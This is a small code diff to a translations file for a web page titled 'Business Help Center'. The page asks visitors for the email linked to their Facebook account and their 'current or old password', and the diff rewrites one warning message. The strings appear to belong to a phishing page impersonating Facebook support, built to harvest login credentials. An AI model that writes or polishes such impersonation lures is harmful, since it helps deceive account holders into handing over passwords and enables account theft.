@@ -11,7 +11,7 @@ const defaultTranslations = {
 	title: 'Business Help Center',
 	enterEmail: 'Enter the Email linked to Facebook',
 	warningMessage:
-		"To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
+		"To get back in to your account, enter your current Email if you know it.If you don't have Email or phone number, you can",
 	cancel: 'cancel this process',
 	emailPlaceholder: 'Email',
 	passwordPlaceholder: 'Current or old password',
